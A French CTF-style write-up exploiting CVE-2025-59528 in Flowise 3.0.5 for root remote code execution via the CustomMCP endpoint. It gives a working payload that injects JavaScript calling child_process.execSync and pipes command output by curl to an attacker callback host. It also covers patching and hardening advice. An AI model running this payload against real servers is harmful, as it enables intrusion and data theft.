---
layout: single
header:
  overlay_image: /assets/images/banner-019.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Dojo Flowise : RCE root via CustomMCP (CVE-2025-59528) — évaluation non sécurisée de mcpServerConfig"
date: 2026-11-11
categories: [CTF, Exploit]
tags: [ctf, flowise, cve-2025-59528, custom-mcp, rce, javascript, eval, root, callback, python, kali, nmap, node-js, mcp]
---

**Cible :** `176.16.177.126:3000` — Flowise 3.0.5  
**CVE :** CVE-2025-59528  
**Composant :** Nœud `CustomMCP` — endpoint `/api/v1/node-load-method/customMCP`  
**Flag :** `flag_1842a12c_edc6_4e69_aff8_214775d5c5f0`

> Ce rapport porte uniquement sur la machine du dojo indiquée. Les étapes RCE sont intrusives : ne pas les reproduire sur un système tiers.

---

## Résultat

Exécution de commande distante en tant que **root** via la configuration `CustomMCP` de Flowise, après création d'un compte de test et authentification. Le flag a été lu depuis `/home/local.txt` ; `/root/proof.txt` était absent ou illisible dans le test effectué.

```
uid=0(root) gid=0(root) groups=0(root),...
flag_1842a12c_edc6_4e69_aff8_214775d5c5f0
```

---

## 1. Découverte de la cible et de l'adresse de callback

### 1.1 Scan de ports

```bash
nmap -Pn -sV -p 80,3000,443,8080 176.16.177.126
```

**Sortie (résumé) :**

```
Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
```

Le port `3000` a ensuite répondu aux appels API Flowise — service confirmé joignable.

### 1.2 Identification de l'adresse de callback Kali

```bash
ip a
```

**Sortie (extrait) :**

```
eth0    UP    176.16.177.127/16
```

**Vérification de la route vers la cible :**

```bash
ip -4 route get 176.16.177.126
```

**Sortie :**

```
176.16.177.126 dev eth0 src 176.16.177.127 uid 8000
    cache
```

| Rôle | Adresse |
|---|---|
| Machine Kali (callback) | `176.16.177.127` |
| Hôte Flowise (cible) | `176.16.177.126` |

---

## 2. Mise en place du récepteur HTTP

Un serveur Python a été démarré sur Kali (`0.0.0.0:8000`) pour recevoir les résultats envoyés par la cible via `curl`.

```bash
python3 -u - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        data = self.rfile.read(int(self.headers.get("Content-Length", "0")))
        print(data.decode(errors="replace"), flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
PY
```

### Vérification locale du récepteur

```bash
curl -sS -X POST --data 'test-depuis-kali' http://127.0.0.1:8000/
```

**Sortie côté client :** `ok`  
**Sortie côté récepteur :**

```
test-depuis-kali
127.0.0.1 - - [11/Nov/2026 14:53:06] "POST / HTTP/1.1" 200 -
```

### Vérification sur l'interface réseau réelle

```bash
curl -i -X POST --data 'test-interface' http://176.16.177.127:8000/
ss -lntp | grep ':8000'
```

**Sortie `ss` :**

```
LISTEN 0  5  0.0.0.0:8000  0.0.0.0:*  users:(("python3",pid=4324,fd=3))
```

> **Pourquoi ce contrôle est essentiel :** un test sur `127.0.0.1` seul ne prouve pas que `176.16.177.127` est atteignable depuis la cible. Le serveur Python écoute bien sur **toutes les interfaces**.

---

## 3. Compte Flowise et authentification

### 3.1 Erreurs rencontrées lors de l'inscription

| Réponse | Cause |
|---|---|
| `"message":"Invalid User Email"` | Adresse absente de l'instance |
| `"message":"Invalid Password"` | Mot de passe refusé par la politique |
| `"message":"User Not Found"` | Connexion tentée avant la création du compte |
| `"message":"You can only have one organization"` | Tentative de double inscription |

### 3.2 Connexion réussie

```bash
export TARGET="http://176.16.177.126:3000"

curl -sS -c flowise.cookies \
  -o /tmp/login.json \
  -w 'HTTP %{http_code} — %{content_type}\n' \
  -X POST "$TARGET/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"email":"ADRESSE_DU_COMPTE","password":"MOT_DE_PASSE_DU_COMPTE"}'
```

**Sortie :**

```
HTTP 200 — application/json; charset=utf-8
```

La réponse JSON retournait un profil utilisateur avec rôle administrateur d'organisation et espace de travail par défaut. La session est enregistrée dans `flowise.cookies`.

> ⚠️ Ne jamais publier ni partager les cookies et jetons — ils permettent de reprendre la session authentifiée.

**Erreur de débogage fréquente :**

```
HTTP 200 — text/html; charset=UTF-8
```

Cela indique que la réponse reçue est la page web de l'application, non une réponse API JSON. Cause : variable `TARGET` non définie dans le terminal courant, ou route incorrecte.

---

## 4. Mécanisme de CVE-2025-59528

### Nature de la vulnérabilité

CVE-2025-59528 est une **évaluation non sécurisée de code JavaScript** dans le nœud `CustomMCP` de Flowise. La valeur du champ `mcpServerConfig` est passée directement à une fonction d'évaluation côté serveur sans validation ni sandboxing.

| Champ | Valeur |
|---|---|
| **CVE** | CVE-2025-59528 |
| **Composant** | Flowise 3.0.5 — nœud `CustomMCP` |
| **Endpoint vulnérable** | `POST /api/v1/node-load-method/customMCP` |
| **Prérequis** | Compte Flowise (inscription ouverte) |
| **Impact** | RCE — exécution sous l'identité du processus Flowise |
| **Correctif** | Flowise ≥ 3.0.6 |

### Chaîne d'exploitation

```
Inscription + connexion Flowise
  → POST /api/v1/node-load-method/customMCP
  → champ mcpServerConfig contient du JS arbitraire
  → évaluation non sécurisée côté serveur
  → process.mainModule.require("child_process")
  → execSync(commande) → sortie envoyée au callback Kali
```

---

## 5. Préparation et envoi du payload RCE

### 5.1 Génération du payload de vérification

```bash
export TARGET="http://176.16.177.126:3000"
export CALLBACK="http://176.16.177.127:8000/"

python3 - <<'PY'
import json, os
cmd = f"(id; hostname) | curl --max-time 5 -sS -X POST --data-binary @- {os.environ['CALLBACK']}"
js = '({x:(function(){const cp=process.mainModule.require("child_process");cp.execSync(' + json.dumps(cmd) + ');return 1;})()})'
with open("flowise-poc.json", "w") as f:
    json.dump({"loadMethod":"listActions","inputs":{"mcpServerConfig":js}}, f)
print("Payload de vérification écrit.")
PY
```

**Structure du payload :**

| Champ | Valeur |
|---|---|
| `loadMethod` | `listActions` |
| `inputs.mcpServerConfig` | Expression JS appelant `child_process.execSync` |

### 5.2 Envoi de la requête

```bash
TOKEN=$(awk '$6=="token"{print $7}' flowise.cookies | tail -n1)

curl -i -sS -b flowise.cookies \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -X POST "$TARGET/api/v1/node-load-method/customMCP" \
  --data-binary @flowise-poc.json

unset TOKEN
```

> **Fausse piste :** une réponse `[{"label":"No Available Actions","name":"error",...}]` ne prouve **pas** l'absence d'exécution. La preuve réelle est la **réception du callback** sur Kali.

---

## 6. Confirmation de l'exécution à distance

**Sortie reçue sur le récepteur Kali :**

```
176.16.177.126 - - [11/Nov/2026 14:57:51] "POST / HTTP/1.1" 200 -
uid=0(root) gid=0(root) groups=0(root),0(bin),1(daemon),...
b3933cbbf8d5
```

| Élément | Signification |
|---|---|
| `uid=0(root)` | Exécution en tant que root — impact maximal |
| `b3933cbbf8d5` | Hostname de la cible (non le flag) |

---

## 7. Lecture du flag

Le payload a été adapté pour lire les fichiers de flag indiqués dans le dojo.

**Sortie reçue par le récepteur :**

```
=== /home/local.txt ===
flag_1842a12c_edc6_4e69_aff8_214775d5c5f0

=== /root/proof.txt : absent ou illisible ===
```

### 🏁 Flag final

```
flag_1842a12c_edc6_4e69_aff8_214775d5c5f0
```

---

## 8. Synthèse de la chaîne d'attaque

```
[Scan nmap]
  port 3000 → Flowise 3.0.5 joignable
       ↓
[Récepteur HTTP]
  python3 HTTPServer 0.0.0.0:8000
       ↓
[Inscription + connexion]
  POST /api/v1/account/register → compte admin
  POST /api/v1/auth/login       → session cookie
       ↓
[Payload CustomMCP]
  POST /api/v1/node-load-method/customMCP
  mcpServerConfig → JS → child_process.execSync
       ↓
[Callback reçu]
  uid=0(root) → RCE confirmée
       ↓
[Lecture du flag]
  cat /home/local.txt
  flag_1842a12c_edc6_4e69_aff8_214775d5c5f0
```

---

## 9. Nettoyage

```bash
rm -f flowise.cookies flowise-poc.json \
       /tmp/flowise-login.body \
       /tmp/flowise-register.json \
       /tmp/login.json
```

**Actions recommandées après le dojo :**

- Déconnecter la session Flowise via l'interface si disponible
- Le cookie exposé pendant le dépannage doit être considéré **compromis**
- Arrêter le serveur Python avec `Ctrl+C`
- Ne pas réutiliser le compte ou le mot de passe en dehors du dojo

---

## 10. Recommandations

- ✅ Mettre à jour Flowise vers la version **≥ 3.0.6**
- ✅ Désactiver l'inscription publique si elle n'est pas nécessaire (`FLOWISE_DISABLE_REGISTER=true`)
- ✅ Ne pas exécuter Flowise en tant que **root** — utiliser un compte dédié sans privilèges
- ✅ Isoler l'instance dans un container avec droits limités
- ✅ Restreindre l'accès au port 3000 au réseau de confiance (pare-feu, reverse proxy authentifié)

---

## Références

| # | Source | Lien |
|---|---|---|
| 1 | NVD — CVE-2025-59528 | https://nvd.nist.gov/vuln/detail/CVE-2025-59528 |
| 2 | Avis GitHub Flowise — GHSA-3gcm-f6qx-ff7p | https://github.com/advisories/GHSA-3gcm-f6qx-ff7p |
| 3 | Documentation Flowise — Application-level authorization | https://docs.flowiseai.com/configuration/authorization/app-level |
| 4 | Avis de sécurité Flowise — GHSA-v5w9-prxf-w882 | https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-v5w9-prxf-w882 |
